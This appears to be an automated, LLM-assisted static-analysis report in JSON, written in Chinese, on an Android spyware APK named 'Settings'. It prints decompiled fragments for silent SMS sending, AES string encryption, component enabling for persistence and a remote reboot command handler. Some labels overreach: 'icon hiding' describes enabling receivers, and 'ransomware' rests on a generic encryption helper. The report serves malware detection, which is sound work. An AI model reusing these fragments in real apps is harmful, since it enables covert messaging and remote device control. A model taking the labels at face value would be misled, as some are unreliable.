@@ -1,0 +1,177 @@
+{
+  "APK信息": {
+    "文件名": "dfd18ac31b4b90ac72649de6ed663fa2fd8719606cd4da7126098e58288693ce.apk",
+    "sha256": "dfd18ac31b4b90ac72649de6ed663fa2fd8719606cd4da7126098e58288693ce",
+    "包名": "com.hawkshawspy",
+    "应用名": "Settings",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 628.7
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        },
+        {
+          "子行为": "wap_billing",
+          "中文名": "WAP计费",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "subscribe"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lme\\hawkshaw\\tasks\\telephony\\MessageSend;",
+          "method_signature": "if(length > 160)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "SmsManager manager = SmsManager.getDefault(); int length = this.message.length(); if (length > 160) { ArrayList messageList = manager.divideMessage(this.message); manager.sendMultipartTextMessage(this.number, null, messageList, null, null); } else { manager.sendTextMessage(this.number, null, this.message, piSend, piDelivered); }",
+          "malicious_code_snippet_context": "SmsManager manager = SmsManager.getDefault(); int length = this.message.length(); if (length > 160) { ArrayList messageList = manager.divideMessage(this.message); manager.sendMultipartTextMessage(this.number, null, messageList, null, null); } else { manager.sendTextMessage(this.number, null, this.message, piSend, piDelivered); }",
+          "behavior_description": "代码通过SmsManager静默发送短信，根据消息长度选择单条或分条发送。短信内容(this.message)和目标号码(this.number)来自实例变量（可能由远程配置或C2指令注入），直接调用sendTextMessage/sendMultipartTextMessage在后台发送，无需用户交互或确认，属于典型的短信欺诈行为，可能导致用户被扣费或向通讯录联系人发送钓鱼短信。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "device_lock",
+          "中文名": "设备锁屏",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "lockNow",
+              "resetPassword"
+            ]
+          }
+        },
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->doFinal",
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": [
+              "encrypt",
+              "decrypt"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lme\\hawkshaw\\utils\\CryptUtil;",
+          "method_signature": "encrypt(String value)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "byte[] bytes = KEY.getBytes(Charsets.UTF_8);\nSecretKeySpec secretKeySpec = new SecretKeySpec(bytes, ALGORITHM);\nCipher cipher = Cipher.getInstance(MODE);\nbyte[] bytes2 = IV.getBytes(Charsets.UTF_8);\ncipher.init(1, secretKeySpec, new IvParameterSpec(bytes2));\nbyte[] bytes3 = value.getBytes(Charsets.UTF_8);\nbyte[] values = cipher.doFinal(bytes3);\nreturn Base64.encodeToString(values, 0);",
+          "malicious_code_snippet_context": "      public final String encrypt(String value) {\n          Intrinsics.checkParameterIsNotNull(value, \"value\");\n          try {\n>>>             byte[] bytes = KEY.getBytes(Charsets.UTF_8);\n>>>             Intrinsics.checkExpressionValueIsNotNull(bytes, \"(this as java.lang.String).getBytes(charset)\");\n>>>             SecretKeySpec secretKeySpec = new SecretKeySpec(bytes, ALGORITHM);\n>>>             Cipher cipher = Cipher.getInstance(MODE);\n>>>             byte[] bytes2 = IV.getBytes(Charsets.UTF_8);\n>>>             Intrinsics.checkExpressionValueIsNotNull(bytes2, \"(this as java.lang.String).getBytes(charset)\");\n>>>             cipher.init(1, secretKeySpec, new IvParameterSpec(bytes2));\n>>>             byte[] bytes3 = value.getBytes(Charsets.UTF_8);\n              Intrinsics.checkExpressionValueIsNotNull(bytes3, \"(this as java.lang.String).getBytes(charset)\");\n              byte[] values = cipher.doFinal(bytes3);\n              return Base64.encodeToString(values, 0);",
+          "behavior_description": "该代码使用硬编码或预设的密钥(KEY)和初始化向量(IV)对传入的字符串(通常是用户文件内容或敏感数据)进行对称加密，并将加密后的数据转换为Base64格式返回。作为勒索软件的核心组件，此操作会导致用户数据无法正常读取，造成直接的数据破坏和用户损失。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lme\\hawkshaw\\HawkshawMainActivity;",
+          "method_signature": "scheduleJob()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "ComponentName receiver0 = new ComponentName(this, BootReceiver.class);\nComponentName receiver1 = new ComponentName(this, CallReceiver.class);\nComponentName receiver2 = new ComponentName(this, SimStateReceiver.class);\ngetPackageManager().setComponentEnabledSetting(receiver0, 1, 1);\ngetPackageManager().setComponentEnabledSetting(receiver1, 1, 1);\ngetPackageManager().setComponentEnabledSetting(receiver2, 1, 1);",
+          "malicious_code_snippet_context": "      private final void scheduleJob() {\n          JobScheduler.schedule$default(JobScheduler.INSTANCE, false, 1, null);\n          FileExplorer.INSTANCE.run(this, Environment.getExternalStorageDirectory().toString());\n>>>         ComponentName receiver0 = new ComponentName(this, (Class<?>) BootReceiver.class);\n>>>         ComponentName receiver1 = new ComponentName(this, (Class<?>) CallReceiver.class);\n>>>         ComponentName receiver2 = new ComponentName(this, (Class<?>) SimStateReceiver.class);\n>>>         getPackageManager().setComponentEnabledSetting(receiver0, 1, 1);\n>>>         getPackageManager().setComponentEnabledSetting(receiver1, 1, 1);\n>>>         getPackageManager().setComponentEnabledSetting(receiver2, 1, 1);\n      }\n  \n      /* JADX INFO: Access modifiers changed from: private */",
+          "behavior_description": "代码通过 setComponentEnabledSetting 启用三个广播接收器组件（BootReceiver、CallReceiver、SimStateReceiver），参数值1表示 COMPONENT_ENABLED_STATE_ENABLED。这使应用能够在开机、来电、SIM卡状态变化等系统事件触发时自动启动并保持后台运行，实现开机自启保活和持久化驻留，为后续恶意行为提供持续运行保障。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_reboot",
+      "中文名": "设备重启",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "reboot"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lme\\hawkshaw\\tasks\\DeviceAdmin;",
+          "method_signature": "if(command.equals(\"reboot\")",
+          "malicious_behavior": "device_reboot",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "if (command.equals(\"reboot\")) {\n    if (Build.VERSION.SDK_INT >= 24) {\n        getMDPM().reboot(getMAdminName());\n    }\n}",
+          "malicious_code_snippet_context": "                  DatabaseUtilsKt.saveLog$default(\"Unknown command @DeviceAdmin\", null, 2, null);\n                  return;\n              case -934938715:\n>>>                 if (command.equals(\"reboot\")) {\n>>>                     if (Build.VERSION.SDK_INT >= 24) {\n>>>                         try {\n>>>                             getMDPM().reboot(getMAdminName());\n>>>                             return;\n                          } catch (Exception e2) {\n                              DatabaseUtilsKt.saveLog$default(\"Error on Rebooting: \" + e2, null, 2, null);\n                              Crashlytics.INSTANCE.logException(e2);",
+          "behavior_description": "代码接收远程下发的命令字符串command，当command为\"reboot\"时，通过DevicePolicyManager.reboot()方法远程重启设备。该行为属于远程控制功能，攻击者可远程触发设备重启，干扰用户正常使用或配合其他恶意操作（如重启后自动激活恶意逻辑）。数据流向：远程命令(command)→DevicePolicyManager.reboot()。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
